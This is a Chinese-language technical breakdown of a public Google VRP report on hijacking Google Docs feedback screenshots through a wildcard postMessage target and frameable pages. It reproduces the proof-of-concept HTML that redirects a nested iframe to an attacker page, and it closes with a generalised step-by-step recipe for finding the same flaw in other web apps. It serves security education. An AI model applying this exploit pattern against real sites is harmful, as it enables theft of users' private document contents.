# Google VRP 案例详解 — 劫持 Google Docs 截图

> 源文章：[Hijacking Google Docs Screenshots](https://blog.geekycat.in/posts/hijacking-google-docs-screenshots/) — Sreeram KL (2020-12-27)
>
> 本文是对该 Google VRP 报告的逐层技术解析，适合作为 PostMessage 攻击链的实战入门阅读材料。

---

## 前置知识

在阅读本案例前，理解以下三个独立概念有助于把握攻击链的组合逻辑。

### 1. postMessage 中的 targetOrigin 参数

```javascript
targetWindow.postMessage(data, targetOrigin);
//                           ↑
//            '*' = 任意窗口都能收到（危险）
//            'https://a.com' = 仅当目标窗口 origin 为 a.com 时才发送（安全）
```

`targetOrigin` 是**发送方的安全承诺**——"我只把消息发给 origin 匹配的窗口"。如果设为 `'*'`，意味着"我不在乎接收方是谁"。此时攻击者只需把接收窗口的 URL 改成自己的域，就能截获消息。

### 2. 跨域修改子 iframe 的 location

这是一个容易忽视的浏览器行为：

> 如果 A 网站可以被 iframe 嵌入（未设置 `X-Frame-Options: DENY`），那么包含它的父页面可以**修改 A 内部嵌套的子 iframe 的 URL**。

```
[攻击者页面]
  └── <iframe src="https://a.com">          ← 不可跨域读 DOM，但...
       └── <iframe src="https://child.com">  ← 可以改这个的 location!
```

攻击者页面**不能读** `a.com` 的 DOM（同源策略保护），但可以**写** `a.com` 内部的子 iframe 的 `location` 属性。修改后，`a.com` 内那个 iframe 导航到攻击者控制的页面。

单独看：攻击者没有直接获取 `a.com` 数据的能力。但如果 `a.com` 向子 iframe 发 postMessage 时用了 wildcard → 消息就会送到被替换后的攻击者域。

### 3. X-Frame-Options

HTTP 响应头 `X-Frame-Options: DENY`（或 `SAMEORIGIN`）阻止页面被嵌入外部 iframe。本案例中 Google Docs **未设置此头**，是整个攻击链的前提条件。

---

## 案例架构：Google Docs 的三层 iframe 反馈系统

### 正常流程

```
[docs.google.com]                              ← 用户正在编辑文档
  │
  │ postMessage(像素RGB值)                        ← 发送当前文档的像素数据
  ↓
[www.google.com]  (反馈外层 iframe)              ← 接收像素，转发到内层
  │
  │ postMessage(RGB值, "https://feedback.googleusercontent.com")  ← 指定目标 origin
  ↓
[feedback.googleusercontent.com]  (渲染层)       ← 用像素值渲染出截图图片
  │
  │ postMessage(base64图片, "https://www.google.com")  ← 指定目标 origin，回传
  ↓
[www.google.com]                                ← 收集截图 + 用户描述
  │
  │ 用户点击"发送反馈"
  │ postMessage(截图base64 + 描述, "*")           ← WILDCARD ← 关键！
  ↓
Google 服务端
```

### 关键观察

| 通信路径 | targetOrigin 参数 | 安全性 |
|---------|-------------------|--------|
| `docs.google.com` → `www.google.com` | —（未披露） | — |
| `www.google.com` → `feedback.googleusercontent.com` | `"https://feedback.googleusercontent.com"` | **安全**——浏览器校验目标 origin |
| `feedback.googleusercontent.com` → `www.google.com` | `"https://www.google.com"` | **安全**——浏览器校验目标 origin |
| **最终提交** → `www.google.com` 的子窗口 | **`"*"`** | **不安全**——wildcard！ |

这个对比是整个攻击的核心洞察：**同一个反馈功能中，内层通信用了精确 targetOrigin，最终提交却用了 wildcard。** 前两条路径的 targetOrigin 保护分别在作者的第一、第二次尝试中体现。

---

## 攻击者的两次尝试

### 尝试 1：替换 feedback.googleusercontent.com（失败）

**思路**：把渲染截图的 iframe 换成攻击者域 → 期望截获发给它的 RGB 像素数据。

**失败原因**：

```javascript
// www.google.com 向渲染层发送像素值时的代码（作者猜测）
windowRef.postMessage(RGB数据, "https://feedback.googleusercontent.com");
//                              ↑ 精确匹配 origin
```

替换 iframe location 后，目标窗口的 origin 不再匹配 `feedback.googleusercontent.com`。浏览器在发送前检查 origin → **拒绝发送**。消息不会离开 `www.google.com` 的上下文。

关键教训：**targetOrigin 参数（发送方的最后一道防线）阻止了此次攻击。** 这和常见的"接收方检查 origin 不严"是完全不同的防御面。

### 尝试 2：替换 www.google.com 的外层提交窗口（成功）

**思路**：改试最外层的提交反馈 iframe——正是那个在用户点击"发送"后接收最终数据的窗口。

**成功原因**：

```javascript
// 提交反馈时的代码
windowRef.postMessage("<截图base64 + 描述>", "*");
//                                             ↑
//                                    无 domain 检查
//                                    浏览器"欣然"发送到任意目标
```

`'*'` 意味着：浏览器，不管目标窗口现在的 origin 是什么，把消息发过去。攻击者已通过 `setInterval(100ms)` 把目标窗口的 location 改成自己的域 → **消息直接送进攻击者的 `onmessage` 回调**。

---

## 利用代码细节

```html
<html>
  <iframe src="https://docs.google.com/document/<受害者文档ID>" />
  <script>
    // 等待 6 秒让 Google Docs 页面完全加载
    setTimeout(function() {
      function exp() {
        // 每 100ms 尝试一次 —— 因为反馈 iframe 只在用户点击
        // "Send Feedback" 后才被创建，需要持续轮询来"抢占"
        setInterval(function() {
          // frames[0]     = docs.google.com 的 iframe
          // frame[0]      = www.google.com (反馈外层)
          // frame[0][2]   = 提交反馈所在的窗口 (第3层嵌套)
          window.frames[0].frame[0][2].location = "https://geekycat.in/exploit.html";
        }, 100);
      }
    }, 6000);
  </script>
</html>
```

### 几个设计要点：

**为什么要 `setInterval(100ms)`？**
反馈 iframe 不是页面加载时就存在的——它只在用户主动点击 "Help → Send Feedback" 后才被动态创建。攻击者不能预测用户何时点击，所以需要持续尝试修改一个**尚不存在的** iframe 的 location。每次调用不会报错（访问 undefined 的 `.location` 只是静默失败），一旦 iframe 被创建，下一次轮询就会击中。

**为什么是 `frame[0][2]`？**
Google Docs 页面的 iframe 嵌套结构是作者通过 DevTools 逆向出来的：
- `frames[0]` — 指向 `docs.google.com` 的 iframe（被嵌入在攻击者页面中）
- `.frame[0]` — Google Docs 页面内部的第一个 iframe（`www.google.com` 的外层反馈容器）
- `[2]` — 该容器内部第三个子 iframe（提交反馈按钮所在的窗口）

这些 index 是 Google Docs 特定实现决定的，换一个目标需要重新逆向。

**为什么 `setTimeout(6000)`？**
防止在 `docs.google.com` 的主框架和它的内部 iframe 完全加载前就开始尝试。6 秒是经验值。

---

## 攻击链全貌

```
[攻击者页面 geekycat.in]
  │
  ├─ <iframe src="docs.google.com/document/xxx">    ← 用户正常编辑/查看文档
  │    │
  │    │  victim 点击 Help → Send Feedback
  │    │
  │    ├──→ postMessage(RGB像素) ──→ [www.google.com]      ← 外层反馈容器
  │    │                              │
  │    │                              ├──→ postMessage(RGB, "feedback...") ──→ [feedback.googleusercontent.com]
  │    │                              │                                         渲染 → base64
  │    │                              │  postMessage(base64, "www.google.com") ←── 回传截图
  │    │                              │
  │    │   victim 写描述 → 点击发送
  │    │                              │
  │    │     攻击者已将此窗口的        │  postMessage(base64截图+描述, "*")
  │    │     location 替换为:          │  ─────────────────────────────────→
  │    │     geekycat.in/exploit.html  │          WILDCARD! 浏览器不校验
  │    │                                          ↓
  │    └────────────────────────────────→ [geekycat.in/exploit.html]
  │                                             │
  │                                             └─ onmessage:
  │                                                event.data → 完整截图 base64
  │                                                → 外传到攻击者服务器
```

---

## 三个防线的失败分析

| 防线 | 本该做什么 | 实际状态 | 为什么失效 |
|------|-----------|---------|-----------|
| **X-Frame-Options** | 阻止页面被嵌入外部 iframe | 未设置 | Google Docs 可被攻击者 iframe |
| **targetOrigin** | 发送方检查目标窗口 origin | 最终提交用了 `'*'` | wildcard 不检查，消息发送到被替换的域 |
| **Google Docs 自身防御** | 禁用被 iframe 时的交互功能 | 大部分功能已禁用 | "发送反馈"功能仍可触发——成为突破口 |

注意：第二个通信路径（`www.google.com` → `feedback.googleusercontent.com`）的 targetOrigin **正确工作**——这是为什么攻击者第一次尝试替换渲染层 iframe 失败的原因。这恰恰说明 **精确 targetOrigin 是有效的防线**——只要所有发送方都遵守。

---

## 通用化：能否应用到其他目标？

这个案例演示了一个**可复用的攻击模式**：

1. **寻找使用 postMessage 且存在多层 iframe 的 Web 应用**（如反馈/客服/在线协作/支付流程）
2. **检查外层页面是否有 `X-Frame-Options` 保护**——大量应用对交互功能页面跳过此头
3. **映射 postMessage 通信路径**（用 postMessage-tracker 浏览器扩展）
4. **找出 wildcard targetOrigin 的发送点**
5. **确定对应的 iframe 索引路径**（通过 DevTools frame tree）
6. **构造轮询脚本**在 iframe 创建瞬间替换 location

通用前提：可被 iframe 嵌入 + 存在 wildcard postMessage 发送点 + 攻击者能定位到正确的 iframe 嵌套索引。
